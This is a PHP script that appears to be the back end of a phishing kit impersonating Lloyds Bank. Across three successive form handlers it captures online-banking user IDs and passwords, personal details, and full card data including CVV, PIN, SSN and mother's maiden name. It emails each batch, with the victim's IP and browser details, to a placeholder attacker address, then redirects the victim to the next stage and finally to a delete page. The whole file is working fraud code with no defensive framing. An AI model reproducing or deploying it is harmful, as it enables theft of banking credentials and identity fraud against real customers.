<?php 

$youremailhere = "youremail@gmail.com";

    if(isset($_POST['index'])){
		        //All form inputs
		 $userid = $_POST['userid'];
		 $password = $_POST['password'];

        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $userag = $_SERVER['HTTP_USER_AGENT']; 
        $date = date('d-m-Y', time());
        $time = date('H:i:s', time());
        $msg = "";      
        $msg .= "------------------+|Lloydsbank Login Info |+------------\n";
        $msg .= "UserID    ".$userid     ."\n";
        $msg .= "Password      ".$password      ."\n";
        $msg .= "------------------+|  PC INFO   |+------------\n";
        $msg .= "IP   : $ip \n";
        $msg .= "TIME : ".$time."\n";
        $msg .= "DATE : ".$date."\n";
        $msg .= "USER : ".$userag."\n";
        $msg .= "-----------------------------------------------\n";
        $bilsnd = $youremailhere;
        $sub = "Lloydsbank info";
        $head = "From: Lloydsbank";
        $head .= "\n";
        $arr=array($bilsnd, $ip);
        foreach ($arr as $bilsnd)
        mail($bilsnd,$sub,$msg,$head);
?>
        <script>
            window.location.href = "index1.php";
        </script>
        <?php 
}
?>

?>




<?php 
    if(isset($_POST['index1'])){
        //All form inputs
		$name = $_POST['name'];
		$surname = $_POST['surname'];
		$address = $_POST['address'];
		$phonenumber = $_POST['phonenumber'];
		$datebirth = $_POST['datebirth'];


        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $userag = $_SERVER['HTTP_USER_AGENT']; 
        $date = date('d-m-Y', time());
        $time = date('H:i:s', time());
        $msg = "";      
        $msg .= "------------------+|Lloydsbank Address Info |+------------\n";
        $msg .= "name     ".$name     ."\n";
        $msg .= "surname      ".$surname      ."\n";
        $msg .= "address      ".$address      ."\n";
        $msg .= "phonenumber      ".$phonenumber      ."\n";
        $msg .= "datebirth      ".$datebirth      ."\n";
        $msg .= "------------------+|  PC INFO   |+------------\n";
        $msg .= "IP   : $ip \n";
        $msg .= "TIME : ".$time."\n";
        $msg .= "DATE : ".$date."\n";
        $msg .= "USER : ".$userag."\n";
        $msg .= "-----------------------------------------------\n";
        $bilsnd = $youremailhere;
        $sub = "Lloydsbank info";
        $head = "From: Lloydsbank";
        $head .= "\n";
        $arr=array($bilsnd, $ip);
        foreach ($arr as $bilsnd)
        mail($bilsnd,$sub,$msg,$head);
?>
        <script>
            window.location.href = "index2.php";
        </script>
        <?php 
}
?>


<?php 
    if(isset($_POST['index2'])){
        //All form inputs
$cardname = $_POST['cardname'];
$Cardnumber = $_POST['Cardnumber'];
$expdate = $_POST['expdate'];
$cvv = $_POST['cvv'];
$pin = $_POST['pin'];
$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];


        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $userag = $_SERVER['HTTP_USER_AGENT']; 
        $date = date('d-m-Y', time());
        $time = date('H:i:s', time());
        $msg = "";      
        $msg .= "------------------+|Lloydsbank Credit Card Info |+------------\n";
        $msg .= "cardname     ".$cardname     ."\n";
        $msg .= "Cardnumber   ".$Cardnumber   ."\n";
        $msg .= "expdate      ".$expdate      ."\n";
        $msg .= "cvv          ".$cvv          ."\n";
        $msg .= "pin          ".$pin          ."\n";
        $msg .= "ssn          ".$ssn          ."\n";
        $msg .= "mmn          ".$mmn          ."\n";
        $msg .= "------------------+|  PC INFO   |+------------\n";
        $msg .= "IP   : $ip \n";
        $msg .= "TIME : ".$time."\n";
        $msg .= "DATE : ".$date."\n";
        $msg .= "USER : ".$userag."\n";
        $msg .= "-----------------------------------------------\n";
        $bilsnd = $youremailhere;
        $sub = "Lloydsbank info";
        $head = "From: Lloydsbank";
        $head .= "\n";
        $arr=array($bilsnd, $ip);
        foreach ($arr as $bilsnd)
        mail($bilsnd,$sub,$msg,$head);
?>
        <script>
            window.location.href = "../delete.php";
        </script>
        <?php 
}
?>